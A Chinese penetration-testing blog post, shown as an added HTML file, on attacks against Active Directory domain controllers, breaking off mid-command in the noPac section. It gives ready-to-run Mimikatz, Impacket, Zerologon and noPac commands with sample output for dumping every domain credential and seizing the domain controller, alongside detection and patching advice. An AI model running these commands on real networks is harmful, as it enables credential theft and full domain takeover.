@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言域控制器（Domain Controller, DC）是 Active Directory 的核心，承载着域内所有的身份认证与资源授权。一旦域控制器被攻陷，整个域便彻底沦陷。本文系统梳理当前主流的域控制器攻击技术，覆盖从凭证窃取到权限提升的完整攻击链，并结合流程图、代码示例与防御建议，帮助渗透测试人员和安全从业者理解这些攻击的原理与防护方法。 攻击技术全景流程图flowchart TB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域控制器攻击技术">
+<meta property="og:url" content="https://congliang.github.io/Intranet-domain-controller/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言域控制器（Domain Controller, DC）是 Active Directory 的核心，承载着域内所有的身份认证与资源授权。一旦域控制器被攻陷，整个域便彻底沦陷。本文系统梳理当前主流的域控制器攻击技术，覆盖从凭证窃取到权限提升的完整攻击链，并结合流程图、代码示例与防御建议，帮助渗透测试人员和安全从业者理解这些攻击的原理与防护方法。 攻击技术全景流程图flowchart TB">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.899Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-domain-controller/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-domain-controller/","path":"Intranet-domain-controller/","title":"域控制器攻击技术"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>域控制器攻击技术 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%85%A8%E6%99%AF%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">攻击技术全景流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81DCSync-%E2%80%94%E2%80%94-%E6%A8%A1%E6%8B%9F%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%A4%8D%E5%88%B6%E5%87%AD%E6%8D%AE"><span class="nav-number">3.</span> <span class="nav-text">一、DCSync —— 模拟域控制器复制凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.2.</span> <span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.3.</span> <span class="nav-text">攻击实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">3.4.</span> <span class="nav-text">检测与防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Zerologon-%E2%80%94%E2%80%94-CVE-2020-1472-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E6%8E%A5%E7%AE%A1"><span class="nav-number">4.</span> <span class="nav-text">二、Zerologon —— CVE-2020-1472 域控制器接管</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">4.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">4.3.</span> <span class="nav-text">攻击步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">4.4.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81sAMAccountName-%E5%86%92%E5%85%85-%E2%80%94%E2%80%94-CVE-2021-42278-CVE-2021-42287"><span class="nav-number">5.</span> <span class="nav-text">三、sAMAccountName 冒充 —— CVE-2021-42278 &#x2F; CVE-2021-42287</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%88Impacket-noPac%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">攻击步骤（Impacket &#x2F; noPac）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1-1"><span class="nav-number">5.3.</span> <span class="nav-text">检测与防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Print-Spooler-%E2%80%94%E2%80%94-PrintNightmare"><span class="nav-number">6.</span> <span class="nav-text">四、Print Spooler —— PrintNightmare</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-number">6.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">6.2.</span> <span class="nav-text">攻击实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="nav-number">6.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81DFSCoerce-%E2%80%94%E2%80%94-%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81"><span class="nav-number">7.</span> <span class="nav-text">五、DFSCoerce —— 分布式文件系统强制认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-4"><span class="nav-number">7.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">7.2.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.3.</span> <span class="nav-text">检测建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Shadow-Credentials-%E2%80%94%E2%80%94-%E5%BD%B1%E5%AD%90%E5%87%AD%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="nav-number">8.</span> <span class="nav-text">六、Shadow Credentials —— 影子凭据攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-5"><span class="nav-number">8.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">8.2.</span> <span class="nav-text">攻击步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1-2"><span class="nav-number">8.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81RBCD-%E2%80%94%E2%80%94-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">9.</span> <span class="nav-text">七、RBCD —— 基于资源的约束委派攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-6"><span class="nav-number">9.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">9.2.</span> <span class="nav-text">完整攻击链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1-3"><span class="nav-number">9.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AF%B9%E7%85%A7%E6%80%BB%E7%BB%93%E8%A1%A8"><span class="nav-number">10.</span> <span class="nav-text">攻击技术对照总结表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">11.</span> <span class="nav-text">综合防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">12.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-domain-controller/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="域控制器攻击技术 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          域控制器攻击技术
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-10-05T08:00:00+08:00">2025-10-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>域控制器（Domain Controller, DC）是 Active Directory 的核心，承载着域内所有的身份认证与资源授权。一旦域控制器被攻陷，整个域便彻底沦陷。本文系统梳理当前主流的域控制器攻击技术，覆盖从凭证窃取到权限提升的完整攻击链，并结合流程图、代码示例与防御建议，帮助渗透测试人员和安全从业者理解这些攻击的原理与防护方法。</p>
+<h2 id="攻击技术全景流程图"><a href="#攻击技术全景流程图" class="headerlink" title="攻击技术全景流程图"></a>攻击技术全景流程图</h2><pre class="mermaid">flowchart TB
+    A[入口点: 普通域用户] --> B{当前权限}
+    B -->|无特权| C[信息收集<br/>BloodHound / ADExplorer]
+    B -->|机器账户| D[MachineAccountQuota 攻击]
+    C --> E{发现攻击路径}
+    E -->|ESI 权限| F[DCSync 攻击<br/>模拟域控复制凭据]
+    E -->|Netlogon 漏洞| G[Zerologon<br/>CVE-2020-1472]
+    E -->|sAMAccountName 篡改| H[sAMAccountName 冒充<br/>CVE-2021-42278 / 42287]
+    E -->|打印服务开启| I[Print Spooler<br/>PrintNightmare]
+    E -->|DFSCoerce 路径| J[DFSCoerce<br/>强制认证中继]
+    E -->|KeyTrust 支持| K[Shadow Credentials<br/>替代 Key Credential]
+    E -->|ACL 可编辑| L[RBCD 攻击<br/>基于资源的约束委派]
+    F --> Z[获取 NTDS.dit 中全部凭据]
+    G --> Z[重置 DC 机器账户密码为空]
+    H --> Z[获取 DC 机器账户 TGT]
+    I --> Z[SYSTEM 权限代码执行]
+    J --> Z[强制 DC 认证并中继]
+    K --> Z[获取 DC 机器账户 TGT]
+    L --> Z[以 DC 身份访问服务]
+    Z --> M[完全控制域控制器]
+    M --> N[持久化 / 横向移动 / 数据窃取]</pre>
+
+<h2 id="一、DCSync-——-模拟域控制器复制凭据"><a href="#一、DCSync-——-模拟域控制器复制凭据" class="headerlink" title="一、DCSync —— 模拟域控制器复制凭据"></a>一、DCSync —— 模拟域控制器复制凭据</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Active Directory 支持多域控制器之间通过 <strong>MS-DRSR（Directory Replication Service）</strong> 协议同步数据。<code>GetNCChanges</code> 是该协议的核心操作，允许一个域控制器从另一个域控制器拉取目录分区更新。拥有 <strong>DS-Replication-Get-Changes</strong> 和 <strong>DS-Replication-Get-Changes-All</strong> 权限（默认由 Domain Admins、Enterprise Admins、Administrators 组持有）的用户可以伪装成域控制器，向真实的 DC 发起目录复制请求，从而获取包括 Kerberos 密钥（AES256、AES128）、NTLM Hash 在内的所有用户凭据。</p>
+<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ul>
+<li>拥有域复制权限（Replicating Directory Changes &#x2F; Replicating Directory Changes All）</li>
+<li>能够与域控制器的 DRSUAPI 端点通信（TCP 135 和动态高端口）</li>
+</ul>
+<h3 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz: 获取指定用户凭据</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:corp.local /user:Administrator</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mimikatz: 批量导出全量凭据到 CSV</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:corp.local /all /csv</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket: 针对 krbtgt 的远程 DCSync</span></span><br><span class="line">impacket<span class="literal">-secretsdump</span> corp.local/backup_svc:<span class="string">&#x27;P@ssw0rd!&#x27;</span>@dc01.corp.local <span class="literal">-just-dc-user</span> krbtgt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket: 导出所有凭据并写入文件（可用 hashcat 离线破解）</span></span><br><span class="line">impacket<span class="literal">-secretsdump</span> corp.local/backup_svc:<span class="string">&#x27;P@ssw0rd!&#x27;</span>@dc01.corp.local <span class="literal">-outputfile</span> dcsync_dump</span><br></pre></td></tr></table></figure>
+
+<h3 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
+<li>监控事件 ID 4662（目录服务访问）：关注 <code>{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}</code> 对应 DS-Replication-Get-Changes-All</li>
+<li>限制拥有域复制权限的账户数量，定期审计</li>
+<li>网络层检测异常的 DRSUAPI 流量，尤其是来自非域控制器的请求</li>
+</ul>
+<hr>
+<h2 id="二、Zerologon-——-CVE-2020-1472-域控制器接管"><a href="#二、Zerologon-——-CVE-2020-1472-域控制器接管" class="headerlink" title="二、Zerologon —— CVE-2020-1472 域控制器接管"></a>二、Zerologon —— CVE-2020-1472 域控制器接管</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>Netlogon 远程协议（MS-NRPC）用于域成员机器与域控制器之间的认证。其 ComputeNetlogonCredential 函数使用 AES-CFB8 加密算法，初始化向量固定全为零。由于 CFB8 模式的弱随机性缺陷，在特定输入下，约有 <strong>1&#x2F;256 的概率</strong> 使 Netlogon 认证通过的凭证计算为零，导致攻击者可以不经任何凭据就通过 Netlogon 认证，进而将域控制器机器账户密码设置为空字符串。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>Windows Server 2008 R2 - 2019（未安装 2020 年 8 月补丁）</li>
+</ul>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: 检测目标是否存在漏洞</span></span><br><span class="line"><span class="comment"># 使用 Impacket 或专用 PoC</span></span><br><span class="line">impacket-zerologon -dc-ip 10.0.0.10 dc01 10.0.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 利用漏洞将 DC 机器账户密码置空</span></span><br><span class="line"><span class="comment"># 运行 PoC（约需 256 次尝试平均命中一次）</span></span><br><span class="line">python3 cve-2020-1472-exploit.py dc01 10.0.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># Performing authentication attempts...</span></span><br><span class="line"><span class="comment"># ==============================</span></span><br><span class="line"><span class="comment"># Attempt 1: failed</span></span><br><span class="line"><span class="comment"># Attempt 2: failed</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># Attempt 23: succeeded!</span></span><br><span class="line"><span class="comment"># Zero Logon successful! DC machine account password reset to empty.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 使用空密码执行 DCSync 导出所有凭据</span></span><br><span class="line">impacket-secretsdump -no-pass -just-dc corp.local/dc01\<span class="variable">$@10</span>.0.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时获取所有用户凭据，域控完全沦陷</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4 (可选): 使用导出的 original 机器账户哈希恢复 DC 密码</span></span><br><span class="line"><span class="comment"># 避免造成持续性拒绝服务</span></span><br><span class="line">impacket-secretsdump -hashes :&lt;original_hash&gt; corp.local/dc01\<span class="variable">$@10</span>.0.0.10 -just-dc</span><br></pre></td></tr></table></figure>
+
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>安装 2020 年 8 月安全更新（KB4566782 &#x2F; KB4571694）</li>
+<li>启用 Netlogon 安全通道强化策略（FullSecureChannelProtection）</li>
+<li>监控事件 ID 5827 &#x2F; 5828 &#x2F; 5829（Netlogon 安全通道异常）</li>
+</ul>
+<hr>
+<h2 id="三、sAMAccountName-冒充-——-CVE-2021-42278-CVE-2021-42287"><a href="#三、sAMAccountName-冒充-——-CVE-2021-42278-CVE-2021-42287" class="headerlink" title="三、sAMAccountName 冒充 —— CVE-2021-42278 &#x2F; CVE-2021-42287"></a>三、sAMAccountName 冒充 —— CVE-2021-42278 &#x2F; CVE-2021-42287</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>这套组合漏洞利用了 Active Directory 在处理 <strong>sAMAccountName</strong> 和 <strong>servicePrincipalName (SPN)</strong> 时的两个独立缺陷：</p>
+<ul>
+<li><strong>CVE-2021-42278</strong>：机器账户的 <code>sAMAccountName</code> 可以改为非 <code>$</code> 结尾的名称，导致它被当作普通用户账户处理，绕过了名称冲突检查</li>
+<li><strong>CVE-2021-42287</strong>：在 Kerberos TGS 请求中，如果 KDC 找不到对应的账户，会自动在名称后追加 <code>$</code> 并重试，实现从普通账户到机器账户的自动降级查找</li>
+</ul>
+<p>两者结合：攻击者先创建机器账户 → 将其 sAMAccountName 改为与域控机器账户同名（不带 <code>$</code>）→ 利用 PAC 缺失向域控请求 TGS → KDC 自动追加 <code>$</code> 查找到真实的域控制器机器账户 → 返回具有 DC 特权的 TGS。</p>
+<h3 id="攻击步骤（Impacket-noPac）"><a href="#攻击步骤（Impacket-noPac）" class="headerlink" title="攻击步骤（Impacket &#x2F; noPac）"></a>攻击步骤（Impacket &#x2F; noPac）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: 创建新的机器账户 (需要 MachineAccountQuota)</span></span><br><span class="line">impacket-addcomputer corp.local/lowuser:<span class="string">&#x27;Password123!&#x27;</span> \</span><br><span class="line">  -dc-ip 10.0.0.10 -computer-name EVIL -computer-pass <span class="string">&#x27;EvilPass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 清除新建机器账户的 servicePrincipalName</span></span><br><span class="line"><span class="comment"># 通过 LDAP 操作移除 SPN，避免名称冲突</span></span><br><span class="line">python3 noPac.py corp.local/lowuser:<span class="string">&#x27;Password123!&#x27;</span> \</span><br><span class="line">  -dc-ip 10.0.0.10 -use-ldap</span><br><span class="line"></span><br><span class="line"><span class="comment"># noPac 自动执行:</span></span><br><span class="line"><span class="comment"># [-] 正在修改 EVIL$ 的 sAMAccountName 为 dc01 (不含 $)</span></span><br><span class="line"><span class="comment"># [-] 请求 TGT for EVIL -&gt; dc01</span></span><br><span class="line"><span class="comment"># [-] 获取了 DC 高权限 TGS</span></span><br><span class="line"><span class="comment"># [*] 成功导入管理员 PAC</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 使用获取的高权限 TGT 执行 